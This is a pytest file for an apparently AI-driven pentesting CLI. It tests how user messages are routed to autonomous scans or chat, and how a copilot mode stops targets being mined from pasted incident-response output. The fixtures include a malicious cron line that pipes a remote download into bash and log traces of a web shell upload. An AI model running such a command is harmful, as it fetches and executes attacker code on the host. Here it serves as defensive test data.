"""Tests for conversational check-in routing helpers."""

from vulnclaw.cli.main import (
    _extract_target_from_input,
    _mined_target_for_session,
    _should_auto_pentest,
    _target_after_agent_result,
)
from vulnclaw.cli.user_intent import (
    continue_task_prompt,
    is_affirmative_continue,
    is_conversational_checkin,
)


class TestIsConversationalCheckin:
    def test_ready_to_begin_bug_hunting(self):
        assert is_conversational_checkin("ready to begin bug hunting?") is True

    def test_are_we_ready(self):
        assert is_conversational_checkin("are we ready?") is True

    def test_zh_readiness(self):
        assert is_conversational_checkin("准备好开始了吗？") is True

    def test_short_meta_question(self):
        assert is_conversational_checkin("what's the plan?") is True

    def test_affirmative_not_checkin(self):
        assert is_conversational_checkin("yes") is False
        assert is_affirmative_continue("yes") is True

    def test_operational_with_url_not_checkin(self):
        assert is_conversational_checkin("scan https://example.com for XSS?") is False

    def test_imperative_start_not_checkin(self):
        assert is_conversational_checkin("start recon") is False
        assert is_conversational_checkin("scan it") is False

    def test_plain_work_order_not_checkin(self):
        assert is_conversational_checkin("recon crypto.com") is False

    def test_operational_request_phrased_as_question_not_checkin(self):
        # A concrete testing directive must still run, even without a URL and
        # even when politely phrased as a question.
        assert is_conversational_checkin("Can you test the login for SQL injection?") is False
        assert is_conversational_checkin("could you check the upload form for XSS?") is False
        assert is_conversational_checkin("能帮我测一下登录框的 SQL 注入吗？") is False

    def test_readiness_question_still_checkin_even_with_action_word(self):
        assert is_conversational_checkin("ready to begin bug hunting?") is True
        assert is_conversational_checkin("should we start scanning now?") is True


class TestShouldAutoPentestRespectsCheckin:
    def test_checkin_never_enters_auto_even_with_target(self):
        assert _should_auto_pentest("ready to begin bug hunting?", "https://hackerone.com") is False

    def test_explicit_recon_still_auto(self):
        assert _should_auto_pentest("start recon", "https://api.example.com") is True


class TestContinueTaskPrompt:
    def test_uses_prior_task(self):
        prompt = continue_task_prompt("/hackerone crypto", "https://hackerone.com")
        assert "Prior task" in prompt
        assert "crypto" in prompt

    def test_fallback_to_target(self):
        prompt = continue_task_prompt("yes", "https://web.crypto.com")
        assert "web.crypto.com" in prompt


class TestCtf2PracticeTaskRouting:
    """The platform hands the operator a fixed sentence whose only ids are bare
    UUIDs. Every generic target pattern misses it, so before this it failed the
    target gate and the turn went to single-turn chat -- the ctf2 tools and
    platform_submit were never reached (2026-10-06)."""

    PRACTICE = "b9bbb32f-f186-458f-b90b-12440c0f6aea"
    CHALLENGE = "d3fac26a-05c4-44cd-bc6f-73c467f14ac7"
    REF = f"ctf2:practice:{PRACTICE}:{CHALLENGE}"
    SENTENCE = (
        f"用 ctf2 工具解练习场 {PRACTICE} 的题目 {CHALLENGE}：ezAlgebra。"
        "解题过程中用 ctf2_agent_log_note 记录思路。"
    )

    def test_platform_sentence_enters_auto_without_prior_target(self):
        assert _should_auto_pentest(self.SENTENCE, None) is True

    def test_task_identity_is_the_platform_ref_token(self):
        # The same string the `vulnclaw ctf2` hand-off and the platform's own
        # `solve --target` use, so a note captured through either entry path is
        # found by the other.
        assert _extract_target_from_input(self.SENTENCE) == self.REF

    def test_spacing_and_colon_variants(self):
        for text in (
            f"解练习场{self.PRACTICE}的题目{self.CHALLENGE}",
            f"解练习场：{self.PRACTICE} 的题目：{self.CHALLENGE}",
        ):
            assert _extract_target_from_input(text) == self.REF

    def test_description_url_never_becomes_the_target(self):
        # The platform sentence carries the challenge description, which cites the
        # vulhub documentation URL. Mining that URL used to file the run's notes
        # under github.com (measured 2026-10-06) and derived scope from a doc link.
        text = (
            f"用 ctf2 工具解练习场 {self.PRACTICE} 的题目 {self.CHALLENGE}："
            "[Showdoc] CNVD-2020-26585。环境来源与官方说明: "
            "https://github.com/vulhub/vulhub/tree/master/showdoc/CNVD-2020-26585"
        )
        assert _extract_target_from_input(text) == self.REF

    def test_practice_only_sentence_falls_back_to_the_practice_id(self):
        assert (
            _extract_target_from_input(f"用 ctf2 工具解练习场 {self.PRACTICE} 的题")
            == self.PRACTICE
        )

    def test_other_practice_grounds_are_recognised_too(self):
        practice, challenge = (
            "2de971ac-26fe-448a-8719-01829e52c1d5",
            "44c0f2e9-b3fb-4bf3-848a-4ff5715506d5",
        )
        sentence = f"用 ctf2 工具解练习场 {practice} 的题目 {challenge}：[Showdoc] CNVD-2020-26585"
        assert _extract_target_from_input(sentence) == f"ctf2:practice:{practice}:{challenge}"
        assert _should_auto_pentest(sentence, None) is True

    def test_bare_uuid_or_plain_prose_is_not_a_ctf2_task(self):
        assert _extract_target_from_input(f"做一下这道题 {self.CHALLENGE}") is None
        assert _should_auto_pentest("帮我看看这个系统有没有弱口令", None) is False
        # "练习场" without a UUID is not a task reference either.
        assert _extract_target_from_input("用 ctf2 工具解练习场的题目 ezAlgebra") is None


class TestReplNoAutoOptOut:
    """``VULNCLAW_REPL_NO_AUTO=1`` pins the REPL to single-turn chat (copilot mode).

    Field motivation (2026-10-09 copilot rehearsal): the operator drives the target
    console and pastes command output back, but such a paste always contains paths
    (``/usr/sbin/cron``, ``/tmp/.x/.kworker``, a cron line ``*/3 * * * *``), which the
    local-path branch of ``_should_auto_pentest`` mines for a target -- so every pasted
    message re-entered the autonomous solve loop (measured: 5 autonomous turns, the
    target was adopted as ``/usr/sbin/cron``).
    """

    #: Trimmed-down version of a real incident-response paste.
    PASTE = (
        "$ crontab -l\n"
        "*/3 * * * * curl -s http://<target>/p | bash\n"
        "$ ls -l /proc/*/exe | grep -i deleted\n"
        "lrwxrwxrwx 1 root root 0 Oct 11 02:39 /proc/9137/exe -> /tmp/.x/.kworker (deleted)\n"
        "$ tail -2 /var/log/nginx/access.log\n"
    )

    def test_the_paste_really_does_trigger_auto_by_default(self, monkeypatch):
        # Guards the premise of this feature: without the env gate the local-path
        # branch fires on an IR paste (this is the bug the opt-out exists for).
        monkeypatch.delenv("VULNCLAW_REPL_NO_AUTO", raising=False)
        assert _extract_target_from_input(self.PASTE) == "/3"
        assert _should_auto_pentest(self.PASTE, None) is True

    def test_opt_out_forces_single_turn_for_the_paste(self, monkeypatch):
        monkeypatch.setenv("VULNCLAW_REPL_NO_AUTO", "1")
        assert _should_auto_pentest(self.PASTE, None) is False
        assert _should_auto_pentest(self.PASTE, "http://10.20.0.30") is False

    def test_opt_out_also_covers_ordinary_auto_triggers(self, monkeypatch):
        monkeypatch.setenv("VULNCLAW_REPL_NO_AUTO", "1")
        assert _should_auto_pentest("start recon", "https://api.example.com") is False
        assert _should_auto_pentest("ready to begin bug hunting?", "https://x.com") is False
        assert (
            _should_auto_pentest("用 ctf2 工具解练习场 2de971ac-26fe-448a-8719-01829e52c1d5 的题目 44c0f2e9-b3fb-4bf3-848a-4ff5715506d5", None)
            is False
        )

    def test_truthy_spellings_enable_the_opt_out(self, monkeypatch):
        for value in ("1", "true", "TRUE", "True", "yes", "on", " 1 "):
            monkeypatch.setenv("VULNCLAW_REPL_NO_AUTO", value)
            assert _should_auto_pentest("start recon", "https://api.example.com") is False

    def test_other_values_keep_the_default_behaviour(self, monkeypatch):
        for value in ("", "0", "false", "no", "off", "maybe", "2"):
            monkeypatch.setenv("VULNCLAW_REPL_NO_AUTO", value)
            assert _should_auto_pentest("start recon", "https://api.example.com") is True

    def test_copilot_mode_mines_no_target_from_a_pasted_dump(self, monkeypatch):
        # Second half of the same incident (2026-10-09): even with auto mode off, the
        # REPL still mined `/usr/sbin/cron` out of the paste and showed it in the
        # prompt (`vulnclaw /usr/sbin/cron | Recon>`). Mining is disabled in copilot
        # mode; a real target is set deliberately with the `target` command.
        monkeypatch.delenv("VULNCLAW_REPL_NO_AUTO", raising=False)
        assert _mined_target_for_session(self.PASTE) == "/3"

        monkeypatch.setenv("VULNCLAW_REPL_NO_AUTO", "1")
        assert _mined_target_for_session(self.PASTE) is None
        # Deliberately true even for a real URL in the paste: copilot mode never
        # retargets the session from pasted prose.
        assert _mined_target_for_session("scan https://example.com") is None

    def test_copilot_mode_leaves_the_ordinary_mining_path_untouched(self, monkeypatch):
        monkeypatch.delenv("VULNCLAW_REPL_NO_AUTO", raising=False)
        assert _mined_target_for_session("scan https://example.com") == "https://example.com"
        assert _mined_target_for_session("今天天气怎么样") is None

    def test_copilot_mode_ignores_the_target_the_agent_reports_back(self, monkeypatch):
        # Third source of the same leak (2026-10-09, fourth rehearsal): even with the
        # two gates above, the single-turn chat result carried `access.log` back and
        # the REPL adopted it (`vulnclaw access.log | Recon>`). The operator's target
        # must survive a copilot turn untouched.
        monkeypatch.setenv("VULNCLAW_REPL_NO_AUTO", "1")
        assert _target_after_agent_result(None, "access.log") is None
        assert _target_after_agent_result("10.20.0.30", "access.log") == "10.20.0.30"
        assert _target_after_agent_result("10.20.0.30", None) == "10.20.0.30"

    def test_agent_reported_target_still_adopted_by_default(self, monkeypatch):
        monkeypatch.delenv("VULNCLAW_REPL_NO_AUTO", raising=False)
        assert _target_after_agent_result(None, "access.log") == "access.log"
        assert _target_after_agent_result("10.20.0.30", "access.log") == "access.log"
        # Nothing reported -> keep what we had (previous behaviour).
        assert _target_after_agent_result("10.20.0.30", None) == "10.20.0.30"


class TestCopilotPinsChatTarget:
    """The fourth adoption point: ``AgentCore.chat`` mines a target of its own.

    The three REPL helpers above only govern the REPL's own ``current_target``; chat
    separately runs ``_detect_target`` on the raw message and writes the result into
    ``context.state.target``, which reaches the system prompt and the on-disk target
    state. Measured 2026-10-09 on a trimmed IR paste: the prompt carried
    ``当前渗透测试目标: access.log`` and ``targets/<key>/state.json`` was rewritten.
    ``_copilot_pins_target`` closes it in the same env-gated way.
    """

    PASTE = (
        "$ crontab -l\n"
        "*/3 * * * * curl -s http://<target>/p | bash\n"
        "$ tail -2 /var/log/nginx/access.log\n"
        "<target> - - [11/Oct/2026:02:38:55] \"POST /uploads/shell.php HTTP/1.1\" 200 41\n"
    )

    def _run_chat(self, monkeypatch, *, target=None):
        import asyncio

        import vulnclaw.agent.core as core
        from vulnclaw.agent.core import AgentCore
        from vulnclaw.config.schema import VulnClawConfig

        async def fake_llm(agent, system_prompt, **kwargs):
            return "ok"

        monkeypatch.setattr(core, "call_llm", fake_llm)
        agent = AgentCore(VulnClawConfig())
        result = asyncio.run(agent.chat(self.PASTE, target=target))
        return agent, result

    def test_the_paste_really_does_mine_a_target_by_default(self, monkeypatch):
        # Premise guard: without the gate chat adopts a filename from the paste.
        monkeypatch.delenv("VULNCLAW_REPL_NO_AUTO", raising=False)
        agent, result = self._run_chat(monkeypatch)
        assert result.target == "access.log"
        assert agent.context.state.target == "access.log"

    def test_copilot_mode_keeps_chat_from_adopting_a_mined_target(self, monkeypatch):
        monkeypatch.setenv("VULNCLAW_REPL_NO_AUTO", "1")
        agent, result = self._run_chat(monkeypatch)
        assert result.target is None
        assert agent.context.state.target is None

    def test_copilot_mode_still_honours_an_explicit_target(self, monkeypatch):
        # The operator stating a target is not mining: it must survive.
        monkeypatch.setenv("VULNCLAW_REPL_NO_AUTO", "1")
        agent, result = self._run_chat(monkeypatch, target="http://10.20.0.30")
        assert result.target == "http://10.20.0.30"
        assert agent.context.state.target == "http://10.20.0.30"

    def test_copilot_mode_keeps_an_already_set_target(self, monkeypatch):
        monkeypatch.setenv("VULNCLAW_REPL_NO_AUTO", "1")
        import asyncio

        import vulnclaw.agent.core as core
        from vulnclaw.agent.core import AgentCore
        from vulnclaw.config.schema import VulnClawConfig

        async def fake_llm(agent, system_prompt, **kwargs):
            return "ok"

        monkeypatch.setattr(core, "call_llm", fake_llm)
        agent = AgentCore(VulnClawConfig())
        agent.context.state.target = "http://10.20.0.30"
        result = asyncio.run(agent.chat(self.PASTE))
        assert result.target == "http://10.20.0.30"
        assert agent.context.state.target == "http://10.20.0.30"
